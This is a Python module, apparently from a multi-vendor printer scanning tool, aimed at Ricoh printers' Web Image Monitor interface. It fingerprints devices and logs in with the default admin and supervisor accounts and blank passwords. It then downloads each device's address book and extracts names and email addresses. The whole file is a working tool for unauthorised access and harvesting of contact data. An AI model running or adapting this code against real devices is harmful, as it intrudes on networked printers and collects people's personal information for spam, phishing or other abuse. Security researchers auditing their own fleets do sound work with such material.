#!/usr/bin/env python3
"""
Ricoh printer module (Web Image Monitor).

    GET  /web/guest/en/websys/webArch/mainFrame.cgi   -> fingerprint
    POST /web/guest/en/websys/webArch/login.cgi       -> base64 userid, blank password
    GET  /web/entry/en/address/adrsList.cgi           -> refresh risessionid
    GET  /web/entry/en/address/adrsListLoadEntry.cgi  -> address book payload

The request shapes here are unchanged from the original standalone Ricoh
checker; only the packaging moved.
"""
import ast
import base64
import re
from typing import Dict, List, Tuple

import requests
from requests.exceptions import RequestException

from .base import (
    Account,
    http_get,
    http_post,
    LoginResult,
    PrinterModule,
    ScanContext,
    Target,
    log_request,
    log_response,
    parse_set_cookies,
)

FIREFOX_UA = (
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0"
)
CHROME_UA = (
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
)

MAIN_FRAME_PATH = "/web/guest/en/websys/webArch/mainFrame.cgi"
LOGIN_PATH = "/web/guest/en/websys/webArch/login.cgi"
AUTH_FORM_PATH = "/web/guest/en/websys/webArch/authForm.cgi"
ADRS_LIST_PATH = "/web/entry/en/address/adrsList.cgi"
ADRS_EXPORT_PATH = "/web/entry/en/address/adrsListLoadEntry.cgi?listCountIn=50&getCountIn=1"
TOP_PAGE_PATH = "/web/entry/en/websys/webArch/topPage.cgi"

EMAIL_RE = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")

# Markers that can only come from the device itself.
STRONG_INDICATORS = ["RICOH", "Web Image Monitor", "rimNote", "rimLocal"]
# Markers that are just fragments of the URL we requested. Any server that
# echoes the request path - a proxy error page, a 404 handler, a WAF block page -
# will hand these back, so they only count once the echo has been stripped out.
PATH_INDICATORS = ["websys/webArch", "/web/guest/"]


class RicohModule(PrinterModule):
    name = "ricoh"
    display_name = "Ricoh printer (Web Image Monitor)"
    supports_export = True
    default_accounts = [
        Account(label="admin", username="admin", password="", can_export=True,
                note="Ricoh default administrator, blank password"),
        Account(label="supervisor", username="supervisor", password="", can_export=False,
                note="Ricoh default supervisor, blank password - cannot read the address book"),
    ]

    # ---- fingerprint ---------------------------------------------------
    def fingerprint(self, target: Target, ctx: ScanContext) -> Tuple[bool, str]:
        url = f"{target.base_url}{MAIN_FRAME_PATH}"
        headers = {
            "User-Agent": FIREFOX_UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
        }
        log_request(ctx, "RICOH CHECK", target.hostport, "GET", url, headers)
        try:
            resp = http_get(url, ctx, headers=headers, allow_redirects=True)
        except RequestException as exc:
            return False, f"Connection error: {exc.__class__.__name__}"

        log_response(ctx, "RICOH CHECK RESPONSE", target.hostport, resp, body_limit=500)

        status = resp.status_code
        text = resp.text or ""

        if status == 200:
            text_upper = text.upper()
            found = [i for i in STRONG_INDICATORS if i.upper() in text_upper]

            # Strip any echo of the URL we just asked for before looking for the
            # path-shaped markers, so a page that merely quotes our own request
            # back at us cannot pass as a printer.
            echo_free = text.replace(url, " ").replace(MAIN_FRAME_PATH, " ").upper()
            found += [i for i in PATH_INDICATORS if i.upper() in echo_free]

            if found:
                return True, f"Ricoh printer detected (found: {', '.join(found[:3])})"
            return False, "Not a Ricoh printer (no Ricoh indicators found in response)"

        if status in (301, 302):
            location = resp.headers.get("Location", "")
            if "authForm.cgi" in location or "login" in location.lower():
                return True, "Ricoh printer detected (redirect to auth page)"
            return False, f"Unexpected redirect to: {location}"

        if status == 404:
            return False, f"Not a Ricoh printer (HTTP {status} - page not found)"
        return False, f"Unexpected response (HTTP {status})"

    # ---- login ---------------------------------------------------------
    def attempt_login(self, target: Target, account: Account, ctx: ScanContext) -> LoginResult:
        result = LoginResult(target=target, vendor=self.name, account=account, outcome="FAIL")

        url = f"{target.base_url}{LOGIN_PATH}"
        headers = {
            "User-Agent": FIREFOX_UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": target.base_url,
            "Referer": f"{target.base_url}{AUTH_FORM_PATH}",
            "Upgrade-Insecure-Requests": "1",
        }
        cookies = {
            "risessionid": "012450409054315",
            "cookieOnOffChecker": "on",
            "wimsesid": "--",
        }
        data = {
            "wimToken": "1615404968",
            "userid_work": "",
            "userid": base64.b64encode(account.username.encode("utf-8")).decode("utf-8"),
            "password_work": "",
            "password": account.password,
            "open": "",
        }

        log_request(ctx, f"LOGIN REQUEST ({account.label})", target.hostport, "POST", url,
                    headers, cookies, data)
        try:
            resp = http_post(url, ctx, headers=headers, cookies=cookies,
                             data=data, allow_redirects=False)
        except RequestException as exc:
            result.outcome = f"ERROR: {exc.__class__.__name__}: {exc}"
            return result

        log_response(ctx, "LOGIN RESPONSE", target.hostport, resp, body_limit=1000)

        status = resp.status_code
        text = resp.text or ""
        result.status_code = status

        if "Authentication has failed" in text:
            result.detail = "authentication has failed"
            return result

        server_cookies = parse_set_cookies(resp)

        if status == 302:
            location = resp.headers.get("Location", "")
            if "mainFrame.cgi" not in location and "authForm.cgi" in location:
                result.detail = "redirected back to the auth form"
                return result
        elif status == 200:
            # Some firmware answers 200 instead of redirecting, but so does every
            # unrelated HTTP service on the internet. Only call it a login when
            # the response actually looks like Web Image Monitor, or the device
            # handed us a session cookie.
            looks_ricoh = any(m.upper() in text.upper() for m in STRONG_INDICATORS)
            got_session = any(name in server_cookies for name in ("risessionid", "wimsesid"))
            if not (looks_ricoh or got_session):
                result.detail = "HTTP 200 with no Web Image Monitor session - not a login"
                return result
        else:
            result.outcome = f"ERROR: HTTP {status}"
            return result

        session_cookies = server_cookies
        for key, value in cookies.items():
            if key not in session_cookies and value != "--":
                session_cookies[key] = value
        session_cookies.setdefault("cookieOnOffChecker", "on")
        if ctx.verbose:
            print(f"[DEBUG] {target.hostport}: Final captured cookies for session: {session_cookies}")

        result.session = {"cookies": session_cookies, "base_url": target.base_url}
        result.outcome = "SUCCESS"
        return result

    # ---- export --------------------------------------------------------
    def export_address_book(self, result: LoginResult, ctx: ScanContext) -> Tuple[str, str]:
        hostport = result.target.hostport
        session = result.session or {}
        if "cookies" not in session:
            return hostport, "ERROR: No session data available"

        base_url = session.get("base_url", result.target.base_url)
        session_cookies: Dict[str, str] = dict(session.get("cookies", {}))
        session_cookies.setdefault("cookieOnOffChecker", "on")

        # STEP 1: load the address list page to mint a fresh risessionid. Only
        # wimsesid and cookieOnOffChecker go along - sending the stale
        # risessionid makes the device refuse to issue a new one.
        adrs_url = f"{base_url}{ADRS_LIST_PATH}"
        adrs_cookies = {
            "wimsesid": session_cookies.get("wimsesid", ""),
            "cookieOnOffChecker": session_cookies.get("cookieOnOffChecker", "on"),
        }
        adrs_headers = {
            "User-Agent": CHROME_UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "frame",
            "Referer": f"{base_url}{TOP_PAGE_PATH}",
            "Connection": "keep-alive",
        }

        log_request(ctx, "ADDRESS LIST REQUEST", hostport, "GET", adrs_url, adrs_headers, adrs_cookies)
        try:
            adrs_resp = http_get(adrs_url, ctx, headers=adrs_headers,
                                 cookies=adrs_cookies, timeout=ctx.export_timeout)
        except RequestException as exc:
            return hostport, f"ERROR: Address list request failed - {exc.__class__.__name__}: {exc}"

        log_response(ctx, "ADDRESS LIST RESPONSE", hostport, adrs_resp, body_limit=500)

        if adrs_resp.status_code != 200:
            return hostport, f"ERROR: Address list request failed with HTTP {adrs_resp.status_code}"

        fresh = parse_set_cookies(adrs_resp).get("risessionid")
        if fresh:
            session_cookies["risessionid"] = fresh
            if ctx.verbose:
                print(f"[DEBUG] {hostport}: Got new risessionid: {fresh}")

        # STEP 2: pull the address book itself.
        url = f"{base_url}{ADRS_EXPORT_PATH}"
        headers = {
            "User-Agent": CHROME_UA,
            "Accept": "text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": f"{base_url}{ADRS_LIST_PATH}",
            "Connection": "keep-alive",
        }

        log_request(ctx, "EXPORT REQUEST", hostport, "GET", url, headers, session_cookies)
        try:
            # Address books are the one response that can legitimately be large.
            resp = http_get(url, ctx, headers=headers, cookies=session_cookies,
                            timeout=ctx.export_timeout, max_bytes=16 * 1024 * 1024)
        except RequestException as exc:
            return hostport, f"ERROR: Export failed - {exc.__class__.__name__}: {exc}"

        log_response(ctx, "EXPORT RESPONSE", hostport, resp, body_limit=1000)

        if resp.status_code != 200:
            return hostport, f"ERROR: Export failed with HTTP {resp.status_code}"

        safe_filename = hostport.replace(":", "_").replace("/", "_")
        output_file = f"{ctx.output_dir}/addressbook_{self.name}_{safe_filename}.txt"
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(resp.text)
        return hostport, f"SUCCESS: Exported to {output_file}"

    # ---- contact extraction --------------------------------------------
    def extract_contacts(self, text: str) -> Tuple[List[str], List[str]]:
        """
        Ricoh returns the address book as a nested array literal:
            [[1,1,'00001','Name','','timestamp','email@example.com',''],...]
        Name sits at index 3, email at index 6.
        """
        content = (text or "").strip()
        if not content:
            return [], []

        emails: List[str] = []
        names: List[str] = []
        try:
            data = ast.literal_eval(content)
        except (ValueError, SyntaxError):
            # Fall back to scraping addresses out of whatever came back.
            return EMAIL_RE.findall(content), []

        if isinstance(data, list):
            for entry in data:
                if not isinstance(entry, list):
                    continue
                if len(entry) > 6:
                    email = entry[6]
                    if isinstance(email, str) and email.strip() and "@" in email and "." in email:
                        emails.append(email.strip())
                if len(entry) > 3:
                    name = entry[3]
                    if isinstance(name, str) and name.strip():
                        names.append(name.strip())
        return emails, names
